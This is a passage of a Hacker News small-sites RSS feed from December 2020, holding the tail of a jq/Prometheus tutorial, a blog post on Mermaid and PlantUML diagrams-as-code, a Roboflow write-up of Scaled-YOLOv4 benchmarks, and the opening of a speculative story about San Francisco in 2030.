<span>"/charmoffensive/toodle-app/pkg/web/page/area.go(160):(*areaView).fetchData"</span>
<span>"/charmoffensive/toodle-app/pkg/web/page/area.go(166):(*areaView).fetchData"</span>
<span>"/charmoffensive/toodle-app/pkg/web/page/area.go(172):(*areaView).fetchData"</span>
<span>"/charmoffensive/toodle-app/pkg/web/page/area_category.go(140):(*areaCategoryView).fetchData"</span>
{... more}
</code></pre>
<p>Now I've got a full list of all the <em>distinct</em> values for this label, which answers my first question.</p>
<h3 id="how-many-unique-values-are-there-for-these-labels-">
    <a href="#how-many-unique-values-are-there-for-these-labels-">
      
    </a>
    How many unique values are there for these labels?</h3><p>Well that's pretty easy at this point...</p>
<pre><code>$ pquery <span>'async_task_total{app="toodle-app"}'</span> \
| jq <span>'.data.result[].metric.task_name'</span> | sort | uniq | wc <span>-l</span>
92
</code></pre>
<p>Ninety-two! Not so bad. Mystery solved, and I can say with reasonable confidence "the cardinality of these labels isn't terribly high, I'm â€¦</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sequoia.makes.software/parsing-json-at-the-cli-a-practical-introduction-to-jq-and-more/">https://sequoia.makes.software/parsing-json-at-the-cli-a-practical-introduction-to-jq-and-more/</a></em></p>]]>
            </description>
            <link>https://sequoia.makes.software/parsing-json-at-the-cli-a-practical-introduction-to-jq-and-more/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25498364</guid>
            <pubDate>Mon, 21 Dec 2020 19:22:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Filling the Void of a Physical Whiteboard]]>
            </title>
            <description>
<![CDATA[
Score 46 | Comments 49 (<a href="https://news.ycombinator.com/item?id=25498031">thread link</a>) | @verletx64
<br/>
December 21, 2020 | https://blog.tawhidhannan.co.uk/practices/fill-void-physical-whiteboard/ | <a href="https://web.archive.org/web/*/https://blog.tawhidhannan.co.uk/practices/fill-void-physical-whiteboard/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
          <p>
We're pretty deep into the whole COVID thing. Where I am in the world, we've been in some variation of lockdown for nine months now. It has meant a lot of changes to my working life, but one of the larger changes to my workflow is that there's no longer a giant whiteboard mounted directly behind me. "Diagrams as code" tools such as <a href="https://plantuml.com/">PlantUML</a> and <a href="https://mermaid-js.github.io/mermaid/#/">Mermaid</a> have gone some way towards filling the void, and I'll examine how far they go in helping me communicate software architecture.
<span id="continue-reading"></span></p>
<h2 id="why-did-i-like-the-whiteboard-so-much">Why did I like the whiteboard so much?&nbsp;<a href="#why-did-i-like-the-whiteboard-so-much" aria-label="Anchor Link For: why-did-i-like-the-whiteboard-so-much">
    
</a></h2>
<p>I think the main thing here is the speed of iteration. When scribbling out an architectural idea, there's usually a bit of back and forth. As long as the diagram is on the whiteboard still, it's easy to erase a few lines here and there and add a few elsewhere.&nbsp;</p>
<p>Using the drag and drop functionalities of tools such as <a href="https://www.lucidchart.com/pages/">LucidChart</a> or <a href="https://app.diagrams.net/">Draw.io</a> can work for this. With that said, I've suffered the indignity of a stray arrow magnetising itself to the wrong box. It's not the worst thing to happen, nor the hardest thing to fix, but I felt I could go faster. </p>
<h2 id="heaping-praise-on-diagrams-as-code">Heaping praise on diagrams as code<a href="#heaping-praise-on-diagrams-as-code" aria-label="Anchor Link For: heaping-praise-on-diagrams-as-code">
    
</a></h2>
<p>Being able to delegate how the diagram looks to something else is a boon for my productivity. I know that I can smash out a diagram in Mermaid syntax and the diagram will look pretty good. Don't get me wrong - no graphics design awards are coming my way, but by and large, the diagram is correct and looks clean.&nbsp;</p>
<p>Here's a simple example that I wrote with Mermaid. Take the following scenario. Service A schedules a task to run at some point with an external service - think of some kind of process that can't be immediately actioned, such as a scheduled task. We're immediately told whether task scheduling worked. If all goes well, the job is eventually delegated to a worker, which carries out it's assigned task. Once that's done, the worker dispatches a webhook notification to service B, allowing us to do whatever further processing logic we need to. Now, I want to describe that using Mermaid syntax. This is what that looks like:</p>
<pre><code><span>sequenceDiagram  
&nbsp;&nbsp;&nbsp;participant Service A  
&nbsp;&nbsp;&nbsp;participant External Service  
&nbsp;&nbsp;&nbsp;participant External Service Worker  
&nbsp;&nbsp;&nbsp;participant Service B  
&nbsp;&nbsp;&nbsp;Service A -&gt;&gt;+ External Service: createJob(notifyEndpoint, jobParameters)  
&nbsp;&nbsp;&nbsp;External Service -&gt;&gt;+ Service A: jobScheduleStatus(id, status)  
&nbsp;&nbsp;&nbsp;External Service --&gt;&gt;+ External Service Worker: startProcessingJob(id)  
&nbsp;&nbsp;&nbsp;External Service Worker -&gt;&gt;+ External Service Worker: processJob(id)  
&nbsp;&nbsp;&nbsp;External Service Worker -&gt;&gt;+ Service B: dispatchWebhookToNotifyEndpoint(notification)  
&nbsp;&nbsp;&nbsp;Service B -&gt;&gt;+ Service B: handleWebhook(notification)
</span></code></pre>
<p>And that produces a diagram that looks something like this<sup><a href="#fn:1">1</a></sup> :</p>
<p><img src="https://blog.tawhidhannan.co.uk/practices/fill-void-physical-whiteboard/mermaid-diagram-20201218194918.png" alt="Visual Diagram for the above Mermaid Sequence Diagram code"></p>
<p>The sequence diagram allows me to express this chain of events tersely in code, but richly in the diagram. I'm able to quick and easily represent operational quirks. For instance, the initialisation of job processing is asynchronous. It doesn't occur immediately, but at some unspecified time in the future. In the diagram, I can express that with a dashed line, and in the code for the diagram, that's as easy as <code>--&gt;&gt;+</code>. Sequence numbers make it easy for me to discuss the diagram with other people, as we can refer to steps by their number. And to add them in was as easy as including a parameter when generating the diagram:&nbsp;</p>
<pre><code><span>{
&nbsp;&nbsp;</span><span>"theme"</span><span>: </span><span>"default"</span><span>,
&nbsp;&nbsp;</span><span>"sequence"</span><span>: {&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;</span><span>"showSequenceNumbers"</span><span>: </span><span>true&nbsp;
&nbsp;&nbsp;</span><span>}
}
</span></code></pre>
<p>Now all the example is perhaps not the most powerful use case. It's a little simple, and it's not tricky to put together a diagram that looks like this with a GUI. In reality these diagrams have a fair bit more going on.</p>
<p>But putting it together in code feels a lot faster for me. The diagram is unsullied by my clumsiness at getting arrows to magnetise to the right box in a WSYWIG web GUI. And this whole thing took me two or three minutes to write - I spent more time coming up with the scenario. I can take the generated image and put it in a ticket, or a slack message, and use it as a visual aid for communicating my thought processes.&nbsp;Even though architectures are more complex in reality, I don't feel like a sense of not being able to express them using these tools.</p>
<p>What's interesting is that I'm more likely to be able to evolve this diagram over time. It doesn't rely on me preserving a whiteboard for all eternity. I can come back later, and make a quick tweak or edit, based on feedback or what have you. I write code every day, so as a method of building something - I'm used to it. Should I make a mistake, or if I want to make some tweak somewhere, I can do that without much fuss. I could even commit these into source control if I wanted to.&nbsp;</p>
<p>The ability to construct diagrams whilst sustaining speed, correctness and clarity are pretty much all I need. If I want to make a particularly pretty diagram (maybe it's for external eyes) I'd use the drag and drop tools. The more complex autogenerated diagrams tend to have a few visual quirks. But where I want the diagram to be evolvable, these tools fill the niche well. The hosted services that provide diagramming as a service see the value in these tools. For example, LucidChart supports its own flavour of syntax, and Draw.IO supports PlantUML and Mermaid syntax.</p>
<h2 id="but-does-it-replace-a-whiteboard">But does it replace a whiteboard?<a href="#but-does-it-replace-a-whiteboard" aria-label="Anchor Link For: but-does-it-replace-a-whiteboard">
    
</a></h2>
<p>Ish. Scribbling on a whiteboard feels faster still - at least for initial construction. And the back and forth with people when etching on a board feels easier.</p>
<p>But, I've gotten faster generating diagrams from code. The syntax for mermaid and PlantUML is pretty simple and easy to remember after a spot of practice. And in a way, it feels accessible in a different way to a whiteboard. We don't have to be in the same room to collaborate. The escape hatch here is that we can always switch to using the WSYWIG to construct the diagram instead. It's slower, but if someone's not up to speed with the syntax and it's not worth them getting up to speed, it's an option.&nbsp;</p>
<p>And beyond that, it lets me get a head start on any artefacts we need for documentation. Producing a quick diagram in the planning phases of a ticket that I can evolve later into something more formal is a big win for sure.&nbsp;</p>
<h2 id="calling-it">Calling It<a href="#calling-it" aria-label="Anchor Link For: calling-it">
    
</a></h2>
<p>Constructing diagrams as code does not replace everything a whiteboard does for me. But it's fast enough, it's easy to get started, and it makes it easy to involve remote people. If everyone knows the syntax, remote collaboration is easy, and you've still got the escape hatch of WSYWIG tools, though they feel slower to use.&nbsp;</p>
<p>I have found that a quick sequence diagram, to help communicate a mental model of a solution can grease the wheels of progress a great deal.</p>


        </div></div>]]>
            </description>
            <link>https://blog.tawhidhannan.co.uk/practices/fill-void-physical-whiteboard/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25498031</guid>
            <pubDate>Mon, 21 Dec 2020 18:49:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scaled-YOLOv4 Is Now the Best Model for Object Detection]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25497774">thread link</a>) | @rocauc
<br/>
December 21, 2020 | https://blog.roboflow.com/scaled-yolov4-tops-efficientdet/ | <a href="https://web.archive.org/web/*/https://blog.roboflow.com/scaled-yolov4-tops-efficientdet/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <div>
                <div><p><em>(based on Microsoft COCO benchmarks)</em></p><p>The object detection space remains white hot with the recent publication of <a href="https://arxiv.org/abs/2011.08036">Scaled-YOLOv4</a>, establishing a new state of the art in <a href="https://blog.roboflow.com/object-detection/">object detection</a>.</p><p>In a David and Goliath fashion, authors Chien-Yao Wang, Alexey Bochkovskiy, and Hong-Yuan Mark Liao (more commonly known by their GitHub monikers, <a href="https://github.com/WongKinYiu">WongKinYiu</a> and <a href="https://github.com/AlexeyAB">AlexyAB</a>) have propelled the YOLOv4 model forward by efficiently scaling the network's design and scale, surpassing the previous state-of-the-art EfficientDet published earlier this year by the Google Research/Brain team. <a href="https://github.com/WongKinYiu">WongKinYiu</a> and <a href="https://github.com/AlexeyAB">AlexyAB</a> scale the YOLO model up and down, beating prior benchmarks from previous small and large object detection models on both ends of the speed vs. accuracy frontier.</p><figure><img src="https://blog.roboflow.com/content/images/2020/12/image.png" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/12/image.png 600w, https://blog.roboflow.com/content/images/2020/12/image.png 650w"><figcaption>Scaled-YOLOv4 achieves record breaking performance on <a href="https://blog.roboflow.com/coco-dataset/">the COCO benchmark</a>, not pictured <a href="https://blog.roboflow.com/train-yolov4-tiny-on-custom-data-lighting-fast-detection/">YOLOv4-tiny</a>, running at 1774 FPS on the RTX 2080ti (<a href="https://arxiv.org/pdf/2011.08036.pdf">cite</a>)</figcaption></figure><p>In this blog, we break down the research involved and the creation of Scaled-YOLOv4 and contextualize the advancement within the current object detection landscape - the most interesting twist being that <em>the Scaled-YOLOv4 implementation is written in the YOLOv5 PyTorch</em> framework.</p><figure><iframe width="459" height="344" src="https://www.youtube.com/embed/HWHHthgek6w?start=9&amp;feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><h2 id="background-on-the-models">Background on the Models</h2><h3 id="object-detection">Object Detection</h3><p><a href="https://blog.roboflow.com/object-detection/">Object detection</a> involves the task of teaching a computer to recognize objects in an image by drawing a box around them (called a <a href="https://blog.roboflow.com/glossary/#:~:text=Bounding%20Box">bounding box</a>), and correctly classifying that box among a limited scope of class labels. In the computer vision landscape today there are many custom object detectors that recognize objects from farm animals to phone defects. </p><h3 id="the-coco-dataset">The COCO Dataset</h3><p><a href="https://blog.roboflow.com/coco-dataset/">The COCO dataset</a> is the gold standard benchmark for evaluating object detection models. The COCO (<a href="https://roboflow.com/formats/coco-json">Common Objects in COntext</a>) dataset contains over 120,000 images for training and testing, with 80 object class labels that are commonly observed in everyday life. Generally, if a model does well on the COCO dataset, it is believed that the model will generalize well to new custom domains - in the spirit of <a href="https://arxiv.org/abs/1612.08242">YOLO9000</a>, for 9000 objects.</p><figure><img src="https://blog.roboflow.com/content/images/2020/12/image-1.png" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/12/image-1.png 600w, https://blog.roboflow.com/content/images/2020/12/image-1.png 617w"><figcaption>Detecting the many objects in the world in <a href="https://arxiv.org/pdf/1612.08242.pdf">the original YOLO9000 model</a></figcaption></figure><h3 id="efficientdet-models-model-scaling">EfficientDet Models - Model Scaling</h3><p>The <a href="https://blog.roboflow.com/breaking-down-efficientdet/">EfficientDet</a> family of models has been the preferred object detection models since it was published by the Google Research/Brain team in recent months. The most novel contribution in the EfficientDet paper was to think strategically about how to scale object detection models up and down. </p><figure><img src="https://blog.roboflow.com/content/images/2020/12/model_scaling.png" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/12/model_scaling.png 600w, https://blog.roboflow.com/content/images/2020/12/model_scaling.png 688w"><figcaption>Model scaling in EfficientDet (<a href="https://arxiv.org/pdf/1911.09070.pdf">cite</a>)</figcaption></figure><p>Object detection models can be scaled by using a large image input resolution, scaling the width of the convolutional network layer, scaling the depth of convolutional layers, and scaling all of these things together. The EfficientDet authors use search to find an optimal scaling threshold from EfficientDet-D0 to EfficientDet-D1, and use this setting to linearly scale up to the famed EfficientDet-D7.</p><h3 id="yolo-models">YOLO Models</h3><p>The YOLO family of models, written in the Darknet framework, has a <a href="https://blog.roboflow.com/a-thorough-breakdown-of-yolov4/">rich history</a> starting with Joseph Redmon (Github moniker <a href="https://pjreddie.com/">pjreddie</a>). Recently, the YOLO name and architecture have been picked up recently by a number of computer vision researchers.</p><p><strong>YOLOv4 - </strong>Early this spring, <a href="https://github.com/AlexeyAB">AlexyAB</a> formalized his fork of the Darknet repo, publishing the state-of-the-art <a href="https://blog.roboflow.com/a-thorough-breakdown-of-yolov4/">YOLOv4 model</a>. YOLOv4 was considered one of the best models for speed and accuracy performance, but did not top EfficientDet's largest model for overall accuracy on the COCO dataset.</p><p><strong>YOLOv5 - </strong>Shortly after the release of YOLOv4, Glenn Jocher (Github moniker <a href="https://github.com/glenn-jocher">glenn-jocher</a>) published his version of the YOLO model in PyTorch as <a href="https://blog.roboflow.com/yolov5-improvements-and-evaluation/">YOLOv5</a>. Comparing how YOLOv4 and YOLOv5 models stacked up against each other was nuanced â€“ we wrote a bunch on the <a href="https://blog.roboflow.com/yolov4-versus-yolov5/"></a><a href="https://blog.roboflow.com/yolov4-versus-yolov5/">YOLOv4 vs</a>.<a href="https://blog.roboflow.com/yolov4-versus-yolov5/"> YOLOv5 </a>debate here.</p><p>The YOLOv5 PyTorch training and architecture conversion was the most notable contribution, making YOLO easier than ever to train, <em>speeding up training time 10x relative to Darknet</em>. </p><p>One of the main reasons Scaled-YOLOv4 is implemented in the YOLOv5 PyTorch framework is, no doubt, the training routines. Glenn Jocher notably gets a shoutout in the Acknowledgments of Scaled-YOLOv4.</p><p><strong>PP-YOLO - </strong>This summer, researchers at <a href="https://www.baidu.com/">Baidu</a> released their version of the YOLO architecture, <a href="https://blog.roboflow.com/pp-yolo-beats-yolov4-object-detection/">PP-YOLO, surpassing YOLOv4 and YOLOv5</a>. The network, written in <a href="https://www.paddlepaddle.org.cn/">the Paddle-Paddle framework</a>, performed well but has yet to gain much traction among practitioners.</p><p><strong>But all of that's old news:</strong> Scaled-YOLOv4 is here and YOLOv4 has been fully <a href="https://arxiv.org/pdf/1911.11929.pdf">CSP-ized</a>!</p><h2 id="scaled-yolov4-techniques">Scaled-YOLOv4 Techniques</h2><p>To scale the YOLOv4 model, the Scaled-YOLOv4 authors explore the following strategies.</p><figure><img src="https://blog.roboflow.com/content/images/2020/12/image-3.png" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/12/image-3.png 600w, https://blog.roboflow.com/content/images/size/w1000/2020/12/image-3.png 1000w, https://blog.roboflow.com/content/images/2020/12/image-3.png 1376w" sizes="(min-width: 720px) 720px"><figcaption>A visualization of the YOLO network, courtesy of <a href="https://arxiv.org/pdf/2007.12099.pdf">PP-YOLO</a>. For more on one-stage object detection architecture see <a href="https://blog.roboflow.com/breaking-down-efficientdet/">breaking down EfficientDet</a> or <a href="https://blog.roboflow.com/pp-yolo-beats-yolov4-object-detection/">breaking down PP-YOLO</a>.</figcaption></figure><p>In general, the Scaled-YOLOv4 authors are holding a few scaling concepts in balance as they are working on the construction of their models - image size, number of layers, and number of channels, while optimizing for model performance and inference speed. They consider a few CSP-ized CNN backbones in their network, ResNet, ResNeXt, and the traditional Darknet backbone.</p><h3 id="csp-izing">"CSP-izing"</h3><p>In the <a href="https://arxiv.org/abs/2011.08036">Scaled-YOLOv4</a> paper the authors often write that they "CSP-ized" a given portion of the network. To CSP-ize means to apply the concepts laid out in the <a href="https://arxiv.org/pdf/1911.11929">Cross-Stage Partial Networks</a> paper, written by <a href="https://github.com/WongKinYiu">WongKinYiu</a>. The CSP is a new way to architect convolutional neural networks that saves on computation for various CNN networks - up to 50% (for the Darknet backbone in FLOPs).</p><h3 id="scaling-the-yolov4-tiny-model">Scaling the YOLOv4-tiny model</h3><p>The YOLOv4-tiny model had different considerations than the Scaled-YOLOv4 model because, on the edge, different constraints come into play, like memory bandwidth and memory access. For the YOLOv4-tiny's shallow CNN, the authors look to <a href="https://arxiv.org/pdf/2011.08036.pdf">OSANet</a> for its favorable computational complexity at little depth.</p><h3 id="scaling-the-yolov4-csp-models">Scaling the YOLOv4-CSP models </h3><p>To detect large objects in large images, the authors find that it is important to increase the depth and number of stages in in the CNN backbone and neck. (Increasing the width reportedly has little effect.) This allows them to first scale up input size and number of stages, and dynamically adjust width and depth according to realtime inference speed requirements. In addition to these scaling factors, the authors also adjust the configuration of their model's architecture in the paper.</p><figure><img src="https://blog.roboflow.com/content/images/2020/12/image-2.png" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/12/image-2.png 600w, https://blog.roboflow.com/content/images/2020/12/image-2.png 695w"><figcaption>YOLOv4-P5/P6/P7 architectures (<a href="https://arxiv.org/pdf/2011.08036.pdf">cite</a>)</figcaption></figure><h3 id="data-augmentations">Data Augmentations</h3><p><a href="https://towardsdatascience.com/data-augmentation-in-yolov4-c16bd22b2617">Data augmentation in YOLOv4</a> was one of the key contributions to YOLOv4's impressive performance. In Scaled-YOLOv4, the authors train on a less augmented dataset first, then turn up the augmentations for fine-tuning at the end of training. They also use "Test Time Augmentations," where a number of augmentations are made on the test set. Predictions are then averaged across those test augmentations to further boost their non-real time results. &nbsp;</p><h2 id="scaled-yolov4-results">Scaled-YOLOv4 Results</h2><p>Evaluations show that the Scaled-YOLOv4 models set the standard for both large and small object detection models.</p><figure><img src="https://blog.roboflow.com/content/images/2020/12/image.png" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/12/image.png 600w, https://blog.roboflow.com/content/images/2020/12/image.png 650w"><figcaption>Scaled-YOLOv4 results, inference speed on the X-axis and COCO average precision on the Y-axis (<a href="https://arxiv.org/pdf/2011.08036.pdf">cite</a>)</figcaption></figure><p>The language in the Scaled-YOLOv4 paper speaks for itself:</p><blockquote>We can see that all scaled YOLOv4 models, including YOLOv4-CSP, YOLOv4-P5, YOLOv4-P6, YOLOv4- P7, are Pareto optimal on all indicators. When we compare YOLOv4-CSP with the same accuracy of EfficientDetD3 (47.5% vs 47.5%), the inference speed is 1.9 times [that of EfficientDetD3]. When YOLOv4-P5 is compared with EfficientDet-D5 with the same accuracy (51.4% vs 51.5%), the inference speed is 2.9 times [that of EfficientDet-D5]. The situation is similar to the comparisons between YOLOv4-P6 vs EfficientDet-D7 (54.3% vs 53.7%) and YOLOv4-P7 vs EfficientDet-D7x (55.4% vs 55.1%). In both cases, YOLOv4-P6 and YOLOv4-P7 are, respectively, 3.7 times and 2.3 times faster in terms of inference speed. </blockquote><p>And notably for YOLOv4-tiny:</p><blockquote>In addition, if one uses TensorRT FP16 to run YOLOv4-tiny on general GPU RTX 2080ti, when the batch size respectively equals to 1 and 4, the respective frame rate can reach 773fps and 1774fps, which is extremely fast.</blockquote><p><strong>If you want to push the ceiling for performance or speed for your object detection task, Scaled-YOLOv4 is the new place to look.</strong></p><p>The authors provide myriad ablation studies and many more research insights than we have written here. Learn more in <a href="https://arxiv.org/pdf/2011.08036.pdf">the paper</a>!</p><h2 id="how-to-train-scaled-yolov4-on-your-own-task">How to Train Scaled-YOLOv4 on Your Own Task</h2><h3 id="how-to-train-yolov4-tiny">How to Train YOLOv4-tiny</h3><p>If you want to train an object detector that is lightning fast and can be deployed on edge devices, then you can train it on YOLOv4-tiny. We have written a nice guide here on <a href="https://blog.roboflow.com/train-yolov4-tiny-on-custom-data-lighting-fast-detection/">how to train and deploy YOLOv4-tiny</a> on your custom data to detect your custom objects.</p><p><em>Note: YOLOv4-tiny is implemented in the Darknet framework, not PyTorch. </em></p><h3 id="how-to-train-yolov4-csp-p5-p6-p7">How to Train YOLOv4-CSP/P5/P6/P7</h3><p>If you want to use a medium sized model, you'll want to use YOLOv4-CSP, and this can be a good place to start iterating on the Scaled-YOLOv4 models. </p><p>If you want to scale up from there for ultimate accuracy, the YOLOv4-P5/P6/P7 models will be of use. </p><p>Here is <a href="https://github.com/WongKinYiu/ScaledYOLOv4/blob/yolov4-large/models/yolov4-csp.yaml">t</a><a href="https://github.com/WongKinYiu/ScaledYOLOv4/blob/yolov4-large/models/yolov4-csp.yaml">he Scaled-YOLOv4 repo</a>, though you will notice that <a href="https://github.com/WongKinYiu">WongKinYiu</a> has provided it there predominantly for research replication purposes and there are not many instructions for training on your own dataset. To train on your own data, our guide on <a href="https://blog.roboflow.com/how-to-train-yolov5-on-a-custom-dataset/">training YOLOv5 in PyTorch on custom data</a> will be useful, as it is a very similar training procedure.</p><p>As is customary with new models, we expect that the implementation of this network on custom tasks will become easier with time and development â€“ including work we will be doing here at <a href="https://blog.roboflow.com/p/155ed7e4-7885-4596-9156-79335139fc87/app.roboflow.com">Roboflow</a>. <a href="https://blog.roboflow.com/p/155ed7e4-7885-4596-9156-79335139fc87/blog.roboflow.com">Stay tuned</a>! </p><!--kg-card-begin: html--><!--kg-card-end: html--><h2 id="conclusion">Conclusion</h2><p>The computer vision landscape is more exciting than ever before. In 2020 alone, a new standard for object detection (as measured on the COCO dataset) has been set four times. </p><p>Faster and more accurate models are making tasks that were marginally outside the reach for vision developers more achievable, whether it is in providing the required accuracy for a given task or making it less expensive to deploy â€¦</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.roboflow.com/scaled-yolov4-tops-efficientdet/">https://blog.roboflow.com/scaled-yolov4-tops-efficientdet/</a></em></p>]]>
            </description>
            <link>https://blog.roboflow.com/scaled-yolov4-tops-efficientdet/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25497774</guid>
            <pubDate>Mon, 21 Dec 2020 18:28:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The San Francisco That Could Have Been]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25497335">thread link</a>) | @ivanagas
<br/>
December 21, 2020 | https://jayriverlong.github.io/2020/12/16/sf.html | <a href="https://web.archive.org/web/*/https://jayriverlong.github.io/2020/12/16/sf.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"> <article role="article">  <p>Iâ€™m running through Lands End. Itâ€™s 8AM on a winter day. Cool mist hangs in the air, and the gravel crunches under my running shoes. Iâ€™m looking at my Apple Watch, checking the time as I run down the hill, past the Cliff House, looking at the Pacific as it shines in the morning sun like a pool of liquid silver stretching to the horizon. California is good. I hear the waves crashing, and the air softly smells of salt and pines. To my left, I see the Pacific Towers: eight fifty-five story glass obelisks stretching into the sky, all connected by a public park up top, six hundred feet in the air. A marvel of modern engineering, only paralleled by a few buildings in Shanghai. The year is 2030. Iâ€™m fortunate to rent a one-bedroom in the Pacific Towers for $2700 a month. I live on the fourteenth floor.</p> <p>I shower while Siri reads me my emails. â€œArchive, archive, skip, schedule for 10AMâ€: speech recognition lets me take care of a full night of notifications. Though my executive and product leaders are in San Francisco, my company otherwise runs on a 24/7 global team, so work accumulates throughout the night.</p> <p>I step out of the shower. My bathroomâ€™s ceiling fans all immediately point hot air at me to help me dry off faster. (Itâ€™s cozy, too.) Iâ€™m rubbing my hair with a towel when soft ringing emanates throughout the apartment. â€œWho is it?â€ I ask. â€œItâ€™s Jess Bergmanâ€ Siri replies. Six hundred speakers and microphones hidden in the walls throughout my 900 square feet make it feel remarkably natural to talk to my virtual assistant.</p> <p>â€œPick upâ€. Jess is on the phone. Sheâ€™s telling me that one of our customers, an oil-shipping company, suffered some kind of bizarre bug where we dispatched one of their tankers without filling it entirely. Itâ€™s a costly error â€“ $8M in oil thatâ€™s left sitting somewhere. Jess and I suspect some of the customerâ€™s tanker sensors are defective, and we line up a diagnostic team to take a look. We sell logistical optimization software.</p> <p>Iâ€™m heading down the elevator to the Pacific Towers to the underground BAMF stop. BAMF was the 2022 successor to BART â€“ everyone recognized â€œBay Area Rapid Transitâ€ as a hilarious oxymoron, an embarrassment compared to our global peers, so our local government and industry leaders created Bay Area Mega Fast: an autonomous metro system modeled after the Hong Kong and Tokyo subways â€“ just twice as fast. Trains arrive every 30 seconds, and Iâ€™ll be at my office in the Tenderloin in exactly 114 seconds.</p> <p>Thereâ€™s only one stop in-between. Iâ€™m proud to say that my company helped design some of the BAMF network for optimal throughput â€“ like all Bay Area projects, itâ€™s a public-private partnership, and the government brought in the best logistical optimizers from industry. Even eight years ago, Iâ€™m flattered to say that was us. Weâ€™re better now, but we still have a long way to go.</p> <p>Iâ€™m wearing my Raycasters inside the BAMF train. Theyâ€™re one brand of many smart glasses that overlay useful information on my field of vision. I usually turn off the auto-recognize, subtitles, and maps, but keep on my vital sign displays. The data is beamed straight from my apple watch. Eyeball control makes it super easy to navigate the interface. It seems that my blood sugar is a little low. I flick through the suggestions. â€œEat a quarter of a Snickers barâ€, it says. Great, Iâ€™ve got some at the office.</p> <p>Iâ€™m out the BAMF and straight up the elevator. My company has half the 85th floor of the Civic Spiral. The building is a glass tornado. It was completed two years ago, and itâ€™s the tallest office building in the world. Rent here is unbelievably expensive â€“ nearly $200 per square foot per year. But itâ€™s a good splurge.</p> <p>I have a meeting to talk about the status on the oil shipping bug and get a little more clarity. Iâ€™m chatting with the team in Dubai, and my EARS2 earphones do real-time translation from Arabic to English. Itâ€™s amazing. The EARS2 founder is a buddy of mine, his office is just the floor below. Heâ€™s got an unbelievable view of the Golden Gate Bridge and the Alcatraz International Airport, where Elon Muskâ€™s grasshopper rockets land and take off all day, sending San Francisco residents around the globe at Mach 2 for lunch meetings. I think itâ€™s extravagant, but to each their own.</p> <p>I step out for lunch with Sam Fultzmann. Heâ€™s the craziest guy I know, which is why I love having lunch with him. We step outside the Civic Spiral and grab little electric longboards to scoot to our favorite Shawarma shop. The longboards recognize me by RFID sensor and automatically bill my Stripe bank account, accurately to the millionth of a dollar. We arrive at Bilalâ€™s Bar and Grill on Market Street. The line for seating is forever long. The GDP of the Tenderloin is nearly a trillion dollars now, but some things just donâ€™t change. We register ourselves for a seating spot with a watch tap, and go for a walk under the trees while we wait. San Francisco got a lot greener after human-driven cars were banned in 2023. The streets were narrowed since autonomous vehicles and personal things like bicycles and skateboards just needed much less space. The fact that just seven years ago, people were driving around twenty-foot-long trucks <em>for just themselves</em> that they left parked 92% of the time is so crazy that I can hardly fathom it.</p> <p>Even though itâ€™s winter, itâ€™s pretty warm outside. There isnâ€™t a building <em>under</em> 300 feet around me, itâ€™s glass and concrete as far as the eye can see. That makes it a little warmer on the ground, but the trees help, and thereâ€™s a Fremont company experimenting with upper-stratosphere reflective seeding to mitigate global warming, which is the overarching culprit here. Iâ€™m due to stop by there later today, actually.</p> <p>Over lunch, Sam tells me that he angel invested in Telomize, a Palo Alto company that does telomere lengthening for anti-aging. (Everyoneâ€™s an angel investor now that thereâ€™s an income tax break if you invest your income in early-stage companies.) We havenâ€™t cracked the aging nut yet, but weâ€™re close. I quiz Sam about the prospects of the company, and he admits that he invested just to get early access to their product. Heâ€™s on it right now. I joke that it could be harmful, but Sam doesnâ€™t care: whatever, thereâ€™s no regulatory body that can stop him from experimenting with novel treatments. He has an 8G feed continuously streaming 200 GB a second of vital sign data back to Telomize company to track the effectiveness and safety of the treatment. There are 35,000 other crazies like him, and between the lot of them theyâ€™re constructing a pretty good medical study in real time.</p> <p>I tell Sam about the oil problem. He tells me he read a book the other day about Rockefeller and the Oil Magnates of the turn of the 20th century: â€œdid you know that Cleveland, Ohio used to be the wealthiest city in the United States?â€ he bursts out, guffawing. â€œCleveland? These guys donâ€™t even have a space programâ€, I laugh. (The Bay Area has three now, all private enterprise with some public backing.)</p> <p>â€œWhat happened?â€ I ask Sam. â€œWell, jeez, itâ€™s like Cleveland just sort of found itself in the middle of an oil boom, geographically. One year they were like any other second-tier industrializing city, and then they suddenly had this huge influx of wealth and enterprise that they didnâ€™t really understandâ€¦ or know how to keep, once things started moving.â€</p> <p>â€œSo what happened, specifically?â€ I ask. â€œWell, the same thing that happens whenever you try to hold sand with your hands and donâ€™t get a bucket: phoosh, it runs through your fingers and then itâ€™s gone. A few decades later the oil industry was in Oklahoma, Texas, everywhere, and then Cleveland was just a small part of it. Standard Oil and what-have-you relocated to New York City.â€ Sam takes a bite from his meatless burger. â€œI think the people of Cleveland were so caught off-guard by the enormous opportunity that hit them in the face that they reacted with some level of arrogance, hubris, and spent their time kind of pooh-poohing the industry, not realizing how lucky they were to be in pole position in the <em>competition</em> for this ginormous industry. So they were asleep at the wheel, and only when the industry moved into other cities did the people of Cleveland understand, by the sheer voracity of competition, how valuable this new industry was.â€</p> <p>â€œYouâ€™re telling me the golden goose made a nest in their back yard and they basically just stayed inside drinking beers and jacking off.â€</p> 